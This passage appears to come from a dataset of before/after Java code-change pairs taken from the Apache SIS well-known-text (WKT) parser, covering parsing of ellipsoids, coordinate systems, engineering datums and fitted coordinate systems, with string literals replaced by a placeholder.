  final ImageDatum datum=parseImageDatum(MANDATORY,element);
  final Unit<?> unit=parseUnit(element);
  final CoordinateSystem cs;
  try {
    cs=parseCoordinateSystem(element,WKTKeywords.Cartesian,2,false,unit,datum);
    final Map<String,?> properties=parseMetadataAndClose(element,name,datum);
    if (cs instanceof AffineCS) {
      return crsFactory.createImageCRS(properties,datum,(AffineCS)cs);
    }
  }
 catch (  FactoryException exception) {
    throw element.parseFailed(exception);
  }
  throw element.illegalCS(cs);
}"
91924,"/** 
 * Parses an   {@code ""Ellipsoid""} element. The syntax is given by<a href=""http://docs.opengeospatial.org/is/12-063r5/12-063r5.html#52"">WKT 2 specification 8.2.1</a>. The legacy WKT 1 pattern was: {@preformat text}SPHEROID[""<name>"", <semi-major axis>, <inverse flattening>  ,<authority>}] }
 * @param mode {@link #FIRST},   {@link #OPTIONAL} or {@link #MANDATORY}.
 * @param parent The parent element.
 * @return The {@code ""Ellipsoid""} element as an {@link Ellipsoid} object.
 * @throws ParseException if the {@code ""Ellipsoid""} element can not be parsed.
 * @see org.apache.sis.referencing.datum.DefaultEllipsoid#formatTo(Formatter)
 */
private Ellipsoid parseEllipsoid(final int mode,final Element parent) throws ParseException {
  final Element element=parent.pullElement(mode,WKTKeywords.Ellipsoid,WKTKeywords.Spheroid);
  if (element == null) {
    return null;
  }
  final String name=element.pullString(""String_Node_Str"");
  final double semiMajorAxis=element.pullDouble(""String_Node_Str"");
  double inverseFlattening=element.pullDouble(""String_Node_Str"");
  Unit<Length> unit=parseScaledUnit(element,WKTKeywords.LengthUnit,SI.METRE);
  if (unit == null) {
    unit=SI.METRE;
  }
  final Map<String,?> properties=parseMetadataAndClose(element,name,null);
  try {
    if (inverseFlattening == 0) {
      return datumFactory.createEllipsoid(properties,semiMajorAxis,semiMajorAxis,unit);
    }
 else {
      return datumFactory.createFlattenedSphere(properties,semiMajorAxis,inverseFlattening,unit);
    }
  }
 catch (  FactoryException exception) {
    throw element.parseFailed(exception);
  }
}","/** 
 * Parses an   {@code ""Ellipsoid""} element. The syntax is given by<a href=""http://docs.opengeospatial.org/is/12-063r5/12-063r5.html#52"">WKT 2 specification 8.2.1</a>. The legacy WKT 1 pattern was: {@preformat wkt}SPHEROID[""<name>"", <semi-major axis>, <inverse flattening>  ,<authority>}] }
 * @param mode {@link #FIRST},   {@link #OPTIONAL} or {@link #MANDATORY}.
 * @param parent The parent element.
 * @return The {@code ""Ellipsoid""} element as an {@link Ellipsoid} object.
 * @throws ParseException if the {@code ""Ellipsoid""} element can not be parsed.
 * @see org.apache.sis.referencing.datum.DefaultEllipsoid#formatTo(Formatter)
 */
private Ellipsoid parseEllipsoid(final int mode,final Element parent) throws ParseException {
  final Element element=parent.pullElement(mode,WKTKeywords.Ellipsoid,WKTKeywords.Spheroid);
  if (element == null) {
    return null;
  }
  final String name=element.pullString(""String_Node_Str"");
  final double semiMajorAxis=element.pullDouble(""String_Node_Str"");
  double inverseFlattening=element.pullDouble(""String_Node_Str"");
  Unit<Length> unit=parseScaledUnit(element,WKTKeywords.LengthUnit,SI.METRE);
  if (unit == null) {
    unit=SI.METRE;
  }
  final Map<String,?> properties=parseMetadataAndClose(element,name,null);
  try {
    if (inverseFlattening == 0) {
      return datumFactory.createEllipsoid(properties,semiMajorAxis,semiMajorAxis,unit);
    }
 else {
      return datumFactory.createFlattenedSphere(properties,semiMajorAxis,inverseFlattening,unit);
    }
  }
 catch (  FactoryException exception) {
    throw element.parseFailed(exception);
  }
}"
91925,"/** 
 * Parses a   {@code ""CS""} element followed by all {@code ""AXIS""} elements.This element has the following pattern (simplified): {@preformat textCS[""<type>"", dimension], AXIS[""<name>"", NORTH | SOUTH | EAST | WEST | UP | DOWN | OTHER], UNIT[""<name>"", <conversion factor>], etc.}This element is different from all other elements parsed by   {@code GeodeticObjectParser}in that its components are sibling elements rather than child elements of the CS element. <p>The optional   {@code ""UNIT[]""} element shall be parsed by the caller. That element may appear after the{@code ""CS[]""} element (not inside). The unit may be forced to some dimension (e.g. {@code ""LengthUnit""}) or be any kind of unit, depending on the context in which this   {@code parseCoordinateSystem()} method isinvoked.</p> <div class=""section"">Variants of Cartesian type</div> The  {@link WKTKeywords#Cartesian} type may be used for projected, geocentric or other kinds of CRS.However while all those variants are of the same CS type, their axis names and directions differ. Current implementation uses the following rules: <ul> <li>If the datum is not geodetic, then the axes of the Cartesian CS are unknown.</li> <li>Otherwise if  {@code dimension is 2}, then the CS is assumed to be for a projected CRS.</li> <li>Otherwise if   {@code dimension is 3}, then the CS is assumed to be for a geocentric CRS.</li> </ul>
 * @param parent      The parent element.
 * @param type        The expected type (Cartesian | ellipsoidal | vertical | etc), or nullif unknown.
 * @param dimension   The minimal number of dimensions. Can be 1 if unknown.
 * @param isWKT1      {@code true} if the parent element is an element from the WKT 1 standard.
 * @param defaultUnit The contextual unit (usually {@code SI.METRE} or {@code SI.RADIAN}), or   {@code null} if unknown.
 * @param datum       The datum of the enclosing CRS, or {@code null} if unknown.
 * @return The {@code ""CS""},   {@code ""UNIT""} and/or {@code ""AXIS""} elements as a Coordinate System, or {@code null}.
 * @throws ParseException if an element can not be parsed.
 * @throws FactoryException if the factory can not create the coordinate system.
 */
private CoordinateSystem parseCoordinateSystem(final Element parent,String type,int dimension,final boolean isWKT1,final Unit<?> defaultUnit,final Datum datum) throws ParseException, FactoryException {
  axisOrder.clear();
  final boolean is3D=(dimension >= 3);
  Map<String,Object> csProperties=null;
  if (!isWKT1) {
    final Element element=parent.pullElement(OPTIONAL,WKTKeywords.CS);
    if (element != null) {
      final String expected=type;
      type=element.pullVoidElement(""String_Node_Str"").keyword;
      dimension=element.pullInteger(""String_Node_Str"");
      csProperties=new HashMap<>(parseMetadataAndClose(element,""String_Node_Str"",null));
      if (expected != null) {
        if (!expected.equalsIgnoreCase(type)) {
          throw new LocalizedParseException(errorLocale,Errors.Keys.UnexpectedValueInElement_2,new String[]{WKTKeywords.CS,type},element.offset);
        }
      }
      if (dimension <= 0 || dimension > 1000) {
        final short key;
        final Object[] args;
        if (dimension <= 0) {
          key=Errors.Keys.ValueNotGreaterThanZero_2;
          args=new Object[]{""String_Node_Str"",dimension};
        }
 else {
          key=Errors.Keys.ExcessiveNumberOfDimensions_1;
          args=new Object[]{dimension};
        }
        throw new LocalizedParseException(errorLocale,key,args,element.offset);
      }
      type=type.equalsIgnoreCase(WKTKeywords.Cartesian) ? WKTKeywords.Cartesian : type.toLowerCase(symbols.getLocale());
    }
  }
  CoordinateSystemAxis[] axes=null;
  CoordinateSystemAxis axis=parseAxis(type == null ? MANDATORY : OPTIONAL,parent,type,defaultUnit);
  if (axis != null) {
    final List<CoordinateSystemAxis> list=new ArrayList<>(dimension + 2);
    do {
      list.add(axis);
      axis=parseAxis(list.size() < dimension ? MANDATORY : OPTIONAL,parent,type,defaultUnit);
    }
 while (axis != null);
    if (!isWKT1 || !ignoreAxes) {
      axes=list.toArray(new CoordinateSystemAxis[list.size()]);
      Arrays.sort(axes,this);
    }
  }
  if (axes == null) {
    if (type == null) {
      throw parent.missingComponent(WKTKeywords.Axis);
    }
    String nx=null, x=null;
    String ny=null, y=null;
    String nz=null, z=null;
    AxisDirection dx=AxisDirection.EAST;
    AxisDirection dy=AxisDirection.NORTH;
    AxisDirection direction=null;
    Unit<?> unit=defaultUnit;
switch (type) {
case WKTKeywords.Cartesian:
{
        if (!(datum instanceof GeodeticDatum)) {
          throw parent.missingComponent(WKTKeywords.Axis);
        }
        if (defaultUnit == null) {
          throw parent.missingComponent(WKTKeywords.LengthUnit);
        }
        if (is3D) {
          return referencing.getGeocentricCS(defaultUnit.asType(Length.class));
        }
        nx=AxisNames.EASTING;
        x=""String_Node_Str"";
        ny=AxisNames.NORTHING;
        y=""String_Node_Str"";
        if (dimension >= 3) {
          z=""String_Node_Str"";
          nz=AxisNames.ELLIPSOIDAL_HEIGHT;
          unit=SI.METRE;
        }
        break;
      }
case WKTKeywords.ellipsoidal:
{
      if (defaultUnit == null) {
        throw parent.missingComponent(WKTKeywords.AngleUnit);
      }
      if (isWKT1) {
        nx=AxisNames.GEODETIC_LONGITUDE;
        x=""String_Node_Str"";
        ny=AxisNames.GEODETIC_LATITUDE;
        y=""String_Node_Str"";
      }
 else {
        nx=AxisNames.GEODETIC_LATITUDE;
        x=""String_Node_Str"";
        dx=AxisDirection.NORTH;
        ny=AxisNames.GEODETIC_LONGITUDE;
        y=""String_Node_Str"";
        dy=AxisDirection.EAST;
      }
      if (dimension >= 3) {
        direction=AxisDirection.UP;
        z=""String_Node_Str"";
        nz=AxisNames.ELLIPSOIDAL_HEIGHT;
        unit=SI.METRE;
      }
      break;
    }
case WKTKeywords.vertical:
{
    if (defaultUnit == null) {
      throw parent.missingComponent(WKTKeywords.Unit);
    }
    z=""String_Node_Str"";
    nz=""String_Node_Str"";
    direction=AxisDirection.UP;
    if (datum instanceof VerticalDatum) {
      final VerticalDatumType vt=((VerticalDatum)datum).getVerticalDatumType();
      if (VerticalDatumType.GEOIDAL.equals(vt)) {
        nz=AxisNames.GRAVITY_RELATED_HEIGHT;
        z=""String_Node_Str"";
      }
 else       if (VerticalDatumType.DEPTH.equals(vt)) {
        direction=AxisDirection.DOWN;
        nz=AxisNames.DEPTH;
        z=""String_Node_Str"";
      }
 else       if (VerticalDatumTypes.ELLIPSOIDAL.equals(vt)) {
        nz=AxisNames.ELLIPSOIDAL_HEIGHT;
      }
    }
    break;
  }
case WKTKeywords.temporal:
{
  if (defaultUnit == null) {
    throw parent.missingComponent(WKTKeywords.TimeUnit);
  }
  direction=AxisDirection.FUTURE;
  nz=""String_Node_Str"";
  z=""String_Node_Str"";
  break;
}
default :
{
throw parent.missingComponent(WKTKeywords.Axis);
}
}
int i=0;
axes=new CoordinateSystemAxis[dimension];
if (x != null && i < dimension) axes[i++]=csFactory.createCoordinateSystemAxis(singletonMap(CoordinateSystemAxis.NAME_KEY,nx),x,dx,defaultUnit);
if (y != null && i < dimension) axes[i++]=csFactory.createCoordinateSystemAxis(singletonMap(CoordinateSystemAxis.NAME_KEY,ny),y,dy,defaultUnit);
if (z != null && i < dimension) axes[i++]=csFactory.createCoordinateSystemAxis(singletonMap(CoordinateSystemAxis.NAME_KEY,nz),z,direction,unit);
}
final String name;
{
final StringBuilder buffer=new StringBuilder();
if (type != null && !type.isEmpty()) {
final int c=type.codePointAt(0);
buffer.appendCodePoint(Character.toUpperCase(c)).append(type,Character.charCount(c),type.length()).append(' ');
}
name=AxisDirections.appendTo(buffer.append(""String_Node_Str""),axes);
}
if (csProperties == null) {
csProperties=singletonMap(CoordinateSystem.NAME_KEY,name);
}
 else {
csProperties.put(CoordinateSystem.NAME_KEY,name);
}
if (type == null) {
return referencing.createAbstractCS(csProperties,axes);
}
switch (type) {
case WKTKeywords.ellipsoidal:
{
switch (axes.length) {
case 2:
return csFactory.createEllipsoidalCS(csProperties,axes[0],axes[1]);
case 3:
return csFactory.createEllipsoidalCS(csProperties,axes[0],axes[1],axes[2]);
}
dimension=(axes.length < 2) ? 2 : 3;
break;
}
case WKTKeywords.Cartesian:
{
switch (axes.length) {
case 2:
return csFactory.createCartesianCS(csProperties,axes[0],axes[1]);
case 3:
return csFactory.createCartesianCS(csProperties,axes[0],axes[1],axes[2]);
}
dimension=(axes.length < 2) ? 2 : 3;
break;
}
case WKTKeywords.affine:
{
switch (axes.length) {
case 2:
return csFactory.createAffineCS(csProperties,axes[0],axes[1]);
case 3:
return csFactory.createAffineCS(csProperties,axes[0],axes[1],axes[2]);
}
dimension=(axes.length < 2) ? 2 : 3;
break;
}
case WKTKeywords.vertical:
{
if (axes.length != (dimension=1)) break;
return csFactory.createVerticalCS(csProperties,axes[0]);
}
case WKTKeywords.temporal:
{
if (axes.length != (dimension=1)) break;
return csFactory.createTimeCS(csProperties,axes[0]);
}
case WKTKeywords.linear:
{
if (axes.length != (dimension=1)) break;
return csFactory.createLinearCS(csProperties,axes[0]);
}
case WKTKeywords.polar:
{
if (axes.length != (dimension=2)) break;
return csFactory.createPolarCS(csProperties,axes[0],axes[1]);
}
case WKTKeywords.cylindrical:
{
if (axes.length != (dimension=3)) break;
return csFactory.createCylindricalCS(csProperties,axes[0],axes[1],axes[2]);
}
case WKTKeywords.spherical:
{
if (axes.length != (dimension=3)) break;
return csFactory.createSphericalCS(csProperties,axes[0],axes[1],axes[2]);
}
case WKTKeywords.parametric:
{
return referencing.createAbstractCS(csProperties,axes);
}
default :
{
warning(Errors.formatInternational(Errors.Keys.UnknownType_1,type),null);
return referencing.createAbstractCS(csProperties,axes);
}
}
throw new LocalizedParseException(errorLocale,(axes.length > dimension) ? Errors.Keys.TooManyOccurrences_2 : Errors.Keys.TooFewOccurrences_2,new Object[]{dimension,WKTKeywords.Axis},parent.offset);
}","/** 
 * Parses a   {@code ""CS""} element followed by all {@code ""AXIS""} elements.This element has the following pattern (simplified): {@preformat wktCS[""<type>"", dimension], AXIS[""<name>"", NORTH | SOUTH | EAST | WEST | UP | DOWN | OTHER], UNIT[""<name>"", <conversion factor>], etc.}This element is different from all other elements parsed by   {@code GeodeticObjectParser}in that its components are sibling elements rather than child elements of the CS element. <p>The optional   {@code ""UNIT[]""} element shall be parsed by the caller. That element may appear after the{@code ""CS[]""} element (not inside). The unit may be forced to some dimension (e.g. {@code ""LengthUnit""}) or be any kind of unit, depending on the context in which this   {@code parseCoordinateSystem()} method isinvoked.</p> <div class=""section"">Variants of Cartesian type</div> The  {@link WKTKeywords#Cartesian} type may be used for projected, geocentric or other kinds of CRS.However while all those variants are of the same CS type, their axis names and directions differ. Current implementation uses the following rules: <ul> <li>If the datum is not geodetic, then the axes of the Cartesian CS are unknown.</li> <li>Otherwise if  {@code dimension is 2}, then the CS is assumed to be for a projected CRS.</li> <li>Otherwise if   {@code dimension is 3}, then the CS is assumed to be for a geocentric CRS.</li> </ul>
 * @param parent      The parent element.
 * @param type        The expected type (Cartesian | ellipsoidal | vertical | etc), or nullif unknown.
 * @param dimension   The minimal number of dimensions. Can be 1 if unknown.
 * @param isWKT1      {@code true} if the parent element is an element from the WKT 1 standard.
 * @param defaultUnit The contextual unit (usually {@code SI.METRE} or {@code SI.RADIAN}), or   {@code null} if unknown.
 * @param datum       The datum of the enclosing CRS, or {@code null} if unknown.
 * @return The {@code ""CS""},   {@code ""UNIT""} and/or {@code ""AXIS""} elements as a Coordinate System, or {@code null}.
 * @throws ParseException if an element can not be parsed.
 * @throws FactoryException if the factory can not create the coordinate system.
 */
private CoordinateSystem parseCoordinateSystem(final Element parent,String type,int dimension,final boolean isWKT1,final Unit<?> defaultUnit,final Datum datum) throws ParseException, FactoryException {
  axisOrder.clear();
  final boolean is3D=(dimension >= 3);
  Map<String,Object> csProperties=null;
  if (!isWKT1) {
    final Element element=parent.pullElement(OPTIONAL,WKTKeywords.CS);
    if (element != null) {
      final String expected=type;
      type=element.pullVoidElement(""String_Node_Str"").keyword;
      dimension=element.pullInteger(""String_Node_Str"");
      csProperties=new HashMap<>(parseMetadataAndClose(element,""String_Node_Str"",null));
      if (expected != null) {
        if (!expected.equalsIgnoreCase(type)) {
          throw new LocalizedParseException(errorLocale,Errors.Keys.UnexpectedValueInElement_2,new String[]{WKTKeywords.CS,type},element.offset);
        }
      }
      if (dimension <= 0 || dimension > 1000) {
        final short key;
        final Object[] args;
        if (dimension <= 0) {
          key=Errors.Keys.ValueNotGreaterThanZero_2;
          args=new Object[]{""String_Node_Str"",dimension};
        }
 else {
          key=Errors.Keys.ExcessiveNumberOfDimensions_1;
          args=new Object[]{dimension};
        }
        throw new LocalizedParseException(errorLocale,key,args,element.offset);
      }
      type=type.equalsIgnoreCase(WKTKeywords.Cartesian) ? WKTKeywords.Cartesian : type.toLowerCase(symbols.getLocale());
    }
  }
  CoordinateSystemAxis[] axes=null;
  CoordinateSystemAxis axis=parseAxis(type == null ? MANDATORY : OPTIONAL,parent,type,defaultUnit);
  if (axis != null) {
    final List<CoordinateSystemAxis> list=new ArrayList<>(dimension + 2);
    do {
      list.add(axis);
      axis=parseAxis(list.size() < dimension ? MANDATORY : OPTIONAL,parent,type,defaultUnit);
    }
 while (axis != null);
    if (!isWKT1 || !ignoreAxes) {
      axes=list.toArray(new CoordinateSystemAxis[list.size()]);
      Arrays.sort(axes,this);
    }
  }
  if (axes == null) {
    if (type == null) {
      throw parent.missingComponent(WKTKeywords.Axis);
    }
    String nx=null, x=null;
    String ny=null, y=null;
    String nz=null, z=null;
    AxisDirection dx=AxisDirection.EAST;
    AxisDirection dy=AxisDirection.NORTH;
    AxisDirection direction=null;
    Unit<?> unit=defaultUnit;
switch (type) {
case WKTKeywords.Cartesian:
{
        if (!(datum instanceof GeodeticDatum)) {
          throw parent.missingComponent(WKTKeywords.Axis);
        }
        if (defaultUnit == null) {
          throw parent.missingComponent(WKTKeywords.LengthUnit);
        }
        if (is3D) {
          return referencing.getGeocentricCS(defaultUnit.asType(Length.class));
        }
        nx=AxisNames.EASTING;
        x=""String_Node_Str"";
        ny=AxisNames.NORTHING;
        y=""String_Node_Str"";
        if (dimension >= 3) {
          z=""String_Node_Str"";
          nz=AxisNames.ELLIPSOIDAL_HEIGHT;
          unit=SI.METRE;
        }
        break;
      }
case WKTKeywords.ellipsoidal:
{
      if (defaultUnit == null) {
        throw parent.missingComponent(WKTKeywords.AngleUnit);
      }
      if (isWKT1) {
        nx=AxisNames.GEODETIC_LONGITUDE;
        x=""String_Node_Str"";
        ny=AxisNames.GEODETIC_LATITUDE;
        y=""String_Node_Str"";
      }
 else {
        nx=AxisNames.GEODETIC_LATITUDE;
        x=""String_Node_Str"";
        dx=AxisDirection.NORTH;
        ny=AxisNames.GEODETIC_LONGITUDE;
        y=""String_Node_Str"";
        dy=AxisDirection.EAST;
      }
      if (dimension >= 3) {
        direction=AxisDirection.UP;
        z=""String_Node_Str"";
        nz=AxisNames.ELLIPSOIDAL_HEIGHT;
        unit=SI.METRE;
      }
      break;
    }
case WKTKeywords.vertical:
{
    if (defaultUnit == null) {
      throw parent.missingComponent(WKTKeywords.Unit);
    }
    z=""String_Node_Str"";
    nz=""String_Node_Str"";
    direction=AxisDirection.UP;
    if (datum instanceof VerticalDatum) {
      final VerticalDatumType vt=((VerticalDatum)datum).getVerticalDatumType();
      if (VerticalDatumType.GEOIDAL.equals(vt)) {
        nz=AxisNames.GRAVITY_RELATED_HEIGHT;
        z=""String_Node_Str"";
      }
 else       if (VerticalDatumType.DEPTH.equals(vt)) {
        direction=AxisDirection.DOWN;
        nz=AxisNames.DEPTH;
        z=""String_Node_Str"";
      }
 else       if (VerticalDatumTypes.ELLIPSOIDAL.equals(vt)) {
        nz=AxisNames.ELLIPSOIDAL_HEIGHT;
      }
    }
    break;
  }
case WKTKeywords.temporal:
{
  if (defaultUnit == null) {
    throw parent.missingComponent(WKTKeywords.TimeUnit);
  }
  direction=AxisDirection.FUTURE;
  nz=""String_Node_Str"";
  z=""String_Node_Str"";
  break;
}
default :
{
throw parent.missingComponent(WKTKeywords.Axis);
}
}
int i=0;
axes=new CoordinateSystemAxis[dimension];
if (x != null && i < dimension) axes[i++]=csFactory.createCoordinateSystemAxis(singletonMap(CoordinateSystemAxis.NAME_KEY,nx),x,dx,defaultUnit);
if (y != null && i < dimension) axes[i++]=csFactory.createCoordinateSystemAxis(singletonMap(CoordinateSystemAxis.NAME_KEY,ny),y,dy,defaultUnit);
if (z != null && i < dimension) axes[i++]=csFactory.createCoordinateSystemAxis(singletonMap(CoordinateSystemAxis.NAME_KEY,nz),z,direction,unit);
}
final String name;
{
final StringBuilder buffer=new StringBuilder();
if (type != null && !type.isEmpty()) {
final int c=type.codePointAt(0);
buffer.appendCodePoint(Character.toUpperCase(c)).append(type,Character.charCount(c),type.length()).append(' ');
}
name=AxisDirections.appendTo(buffer.append(""String_Node_Str""),axes);
}
if (csProperties == null) {
csProperties=singletonMap(CoordinateSystem.NAME_KEY,name);
}
 else {
csProperties.put(CoordinateSystem.NAME_KEY,name);
}
if (type == null) {
return referencing.createAbstractCS(csProperties,axes);
}
switch (type) {
case WKTKeywords.ellipsoidal:
{
switch (axes.length) {
case 2:
return csFactory.createEllipsoidalCS(csProperties,axes[0],axes[1]);
case 3:
return csFactory.createEllipsoidalCS(csProperties,axes[0],axes[1],axes[2]);
}
dimension=(axes.length < 2) ? 2 : 3;
break;
}
case WKTKeywords.Cartesian:
{
switch (axes.length) {
case 2:
return csFactory.createCartesianCS(csProperties,axes[0],axes[1]);
case 3:
return csFactory.createCartesianCS(csProperties,axes[0],axes[1],axes[2]);
}
dimension=(axes.length < 2) ? 2 : 3;
break;
}
case WKTKeywords.affine:
{
switch (axes.length) {
case 2:
return csFactory.createAffineCS(csProperties,axes[0],axes[1]);
case 3:
return csFactory.createAffineCS(csProperties,axes[0],axes[1],axes[2]);
}
dimension=(axes.length < 2) ? 2 : 3;
break;
}
case WKTKeywords.vertical:
{
if (axes.length != (dimension=1)) break;
return csFactory.createVerticalCS(csProperties,axes[0]);
}
case WKTKeywords.temporal:
{
if (axes.length != (dimension=1)) break;
return csFactory.createTimeCS(csProperties,axes[0]);
}
case WKTKeywords.linear:
{
if (axes.length != (dimension=1)) break;
return csFactory.createLinearCS(csProperties,axes[0]);
}
case WKTKeywords.polar:
{
if (axes.length != (dimension=2)) break;
return csFactory.createPolarCS(csProperties,axes[0],axes[1]);
}
case WKTKeywords.cylindrical:
{
if (axes.length != (dimension=3)) break;
return csFactory.createCylindricalCS(csProperties,axes[0],axes[1],axes[2]);
}
case WKTKeywords.spherical:
{
if (axes.length != (dimension=3)) break;
return csFactory.createSphericalCS(csProperties,axes[0],axes[1],axes[2]);
}
case WKTKeywords.parametric:
{
return referencing.createAbstractCS(csProperties,axes);
}
default :
{
warning(parent,null,Errors.formatInternational(Errors.Keys.UnknownType_1,type),null);
return referencing.createAbstractCS(csProperties,axes);
}
}
throw new LocalizedParseException(errorLocale,(axes.length > dimension) ? Errors.Keys.TooManyOccurrences_2 : Errors.Keys.TooFewOccurrences_2,new Object[]{dimension,WKTKeywords.Axis},parent.offset);
}"
91926,"/** 
 * Parses a   {@code ""EngineeringDatum""} (WKT 2) element. The syntax is given by<a href=""http://docs.opengeospatial.org/is/12-063r5/12-063r5.html#76"">WKT 2 specification 11.2</a>. The legacy WKT 1 pattern was: {@preformat text}LOCAL_DATUM[""<name>"", <datum type>  ,<authority>}] } The datum type (WKT 1 only) is currently ignored.
 * @param mode   {@link #FIRST},   {@link #OPTIONAL} or {@link #MANDATORY}.
 * @param parent The parent element.
 * @param isWKT1 {@code true} if the parent is a WKT 1 element.
 * @return The {@code ""EngineeringDatum""} element as an {@link EngineeringDatum} object.
 * @throws ParseException if the {@code ""EngineeringDatum""} element can not be parsed.
 */
private EngineeringDatum parseEngineeringDatum(final int mode,final Element parent,final boolean isWKT1) throws ParseException {
  final Element element=parent.pullElement(mode,WKTKeywords.EngineeringDatum,WKTKeywords.EDatum,WKTKeywords.Local_Datum);
  if (element == null) {
    return null;
  }
  final String name=element.pullString(""String_Node_Str"");
  if (isWKT1) {
    element.pullInteger(""String_Node_Str"");
  }
  try {
    return datumFactory.createEngineeringDatum(parseAnchorAndClose(element,name));
  }
 catch (  FactoryException exception) {
    throw element.parseFailed(exception);
  }
}","/** 
 * Parses a   {@code ""EngineeringDatum""} (WKT 2) element. The syntax is given by<a href=""http://docs.opengeospatial.org/is/12-063r5/12-063r5.html#76"">WKT 2 specification 11.2</a>. The legacy WKT 1 pattern was: {@preformat wkt}LOCAL_DATUM[""<name>"", <datum type>  ,<authority>}] } The datum type (WKT 1 only) is currently ignored.
 * @param mode   {@link #FIRST},   {@link #OPTIONAL} or {@link #MANDATORY}.
 * @param parent The parent element.
 * @param isWKT1 {@code true} if the parent is a WKT 1 element.
 * @return The {@code ""EngineeringDatum""} element as an {@link EngineeringDatum} object.
 * @throws ParseException if the {@code ""EngineeringDatum""} element can not be parsed.
 */
private EngineeringDatum parseEngineeringDatum(final int mode,final Element parent,final boolean isWKT1) throws ParseException {
  final Element element=parent.pullElement(mode,WKTKeywords.EngineeringDatum,WKTKeywords.EDatum,WKTKeywords.Local_Datum);
  if (element == null) {
    return null;
  }
  final String name=element.pullString(""String_Node_Str"");
  if (isWKT1) {
    element.pullInteger(""String_Node_Str"");
  }
  try {
    return datumFactory.createEngineeringDatum(parseAnchorAndClose(element,name));
  }
 catch (  FactoryException exception) {
    throw element.parseFailed(exception);
  }
}"
91927,"/** 
 * Parses a   {@code ""FITTED_CS""} element.This element has the following pattern: {@preformat textFITTED_CS[""<name>"", <to base>, <base cs>]}
 * @param mode {@link #FIRST},   {@link #OPTIONAL} or {@link #MANDATORY}.
 * @param parent The parent element.
 * @return The {@code ""FITTED_CS""} element as a {@link CompoundCRS} object.
 * @throws ParseException if the {@code ""COMPD_CS""} element can not be parsed.
 */
private DerivedCRS parseFittedCS(final int mode,final Element parent) throws ParseException {
  final Element element=parent.pullElement(mode,WKTKeywords.Fitted_CS);
  if (element == null) {
    return null;
  }
  final String name=element.pullString(""String_Node_Str"");
  final MathTransform toBase=parseMathTransform(element,true);
  final OperationMethod method=getOperationMethod();
  final CoordinateReferenceSystem baseCRS=parseCoordinateReferenceSystem(element,true);
  if (!(baseCRS instanceof SingleCRS)) {
    throw new LocalizedParseException(errorLocale,Errors.Keys.UnexpectedValueInElement_2,new Object[]{WKTKeywords.Fitted_CS,baseCRS.getClass()},element.offset);
  }
  final CoordinateSystemAxis[] axes=new CoordinateSystemAxis[toBase.getSourceDimensions()];
  final StringBuilder buffer=new StringBuilder(name).append(""String_Node_Str"");
  final int start=buffer.length();
  try {
    for (int i=0; i < axes.length; i++) {
      final String number=String.valueOf(i);
      buffer.setLength(start);
      buffer.append(number);
      axes[i]=csFactory.createCoordinateSystemAxis(singletonMap(CoordinateSystemAxis.NAME_KEY,buffer.toString()),number,AxisDirection.OTHER,Unit.ONE);
    }
    final Map<String,Object> properties=parseMetadataAndClose(element,name,baseCRS);
    final CoordinateSystem derivedCS=referencing.createAbstractCS(singletonMap(CoordinateSystem.NAME_KEY,AxisDirections.appendTo(new StringBuilder(""String_Node_Str""),axes)),axes);
    properties.put(""String_Node_Str"",name);
    return referencing.createDerivedCRS(properties,(SingleCRS)baseCRS,method,toBase.inverse(),derivedCS);
  }
 catch (  FactoryException|NoninvertibleTransformException exception) {
    throw element.parseFailed(exception);
  }
}","/** 
 * Parses a   {@code ""FITTED_CS""} element.This element has the following pattern: {@preformat wktFITTED_CS[""<name>"", <to base>, <base cs>]}
 * @param mode {@link #FIRST},   {@link #OPTIONAL} or {@link #MANDATORY}.
 * @param parent The parent element.
 * @return The {@code ""FITTED_CS""} element as a {@link CompoundCRS} object.
 * @throws ParseException if the {@code ""COMPD_CS""} element can not be parsed.
 */
private DerivedCRS parseFittedCS(final int mode,final Element parent) throws ParseException {
  final Element element=parent.pullElement(mode,WKTKeywords.Fitted_CS);
  if (element == null) {
    return null;
  }
  final String name=element.pullString(""String_Node_Str"");
  final MathTransform toBase=parseMathTransform(element,true);
  final OperationMethod method=getOperationMethod();
  final CoordinateReferenceSystem baseCRS=parseCoordinateReferenceSystem(element,true);
  if (!(baseCRS instanceof SingleCRS)) {
    throw new LocalizedParseException(errorLocale,Errors.Keys.UnexpectedValueInElement_2,new Object[]{WKTKeywords.Fitted_CS,baseCRS.getClass()},element.offset);
  }
  final CoordinateSystemAxis[] axes=new CoordinateSystemAxis[toBase.getSourceDimensions()];
  final StringBuilder buffer=new StringBuilder(name).append(""String_Node_Str"");
  final int start=buffer.length();
  try {
    for (int i=0; i < axes.length; i++) {
      final String number=String.valueOf(i);
      buffer.setLength(start);
      buffer.append(number);
      axes[i]=csFactory.createCoordinateSystemAxis(singletonMap(CoordinateSystemAxis.NAME_KEY,buffer.toString()),number,AxisDirection.OTHER,Unit.ONE);
    }
    final Map<String,Object> properties=parseMetadataAndClose(element,name,baseCRS);
    final CoordinateSystem derivedCS=referencing.createAbstractCS(singletonMap(CoordinateSystem.NAME_KEY,AxisDirections.appendTo(new StringBuilder(""String_Node_Str""),axes)),axes);
    properties.put(""String_Node_Str"",name);
    return referencing.createDerivedCRS(properties,(SingleCRS)baseCRS,method,toBase.inverse(),derivedCS);
  }
 catch (  FactoryException|NoninvertibleTransformException exception) {
    throw element.parseFailed(exception);
  }
}"
91928,"/** 
 * Parses a   {@code ""EngineeringCRS""} (WKT 2) element. The syntax is given by<a href=""http://docs.opengeospatial.org/is/12-063r5/12-063r5.html#74"">WKT 2 specification 11</a>. The legacy WKT 1 pattern was: {@preformat text}LOCAL_CS[""<name>"", <local datum>, <unit>, <axis>,  ,<axis>}* {,<authority>}] }
 * @param mode      {@link #FIRST},   {@link #OPTIONAL} or {@link #MANDATORY}.
 * @param parent    The parent element.
 * @param isBaseCRS {@code true} if parsing the CRS inside a {@code DerivedCRS}.
 * @return The {@code ""EngineeringCRS""} element as an {@link EngineeringCRS} object.
 * @throws ParseException if the {@code ""EngineeringCRS""} element can not be parsed.
 */
private SingleCRS parseEngineeringCRS(final int mode,final Element parent,final boolean isBaseCRS) throws ParseException {
  final Element element=parent.pullElement(mode,isBaseCRS ? new String[]{WKTKeywords.BaseEngCRS} : new String[]{WKTKeywords.EngineeringCRS,WKTKeywords.EngCRS,WKTKeywords.Local_CS});
  if (element == null) {
    return null;
  }
  final boolean isWKT1=element.getKeywordIndex() == 2;
  final String name=element.pullString(""String_Node_Str"");
  final Unit<?> unit=parseUnit(element);
  EngineeringDatum datum=null;
  SingleCRS baseCRS=null;
  Conversion fromBase=null;
  if (!isWKT1 && !isBaseCRS) {
    fromBase=parseDerivingConversion(OPTIONAL,element,WKTKeywords.DerivingConversion,unit,null);
    if (fromBase != null) {
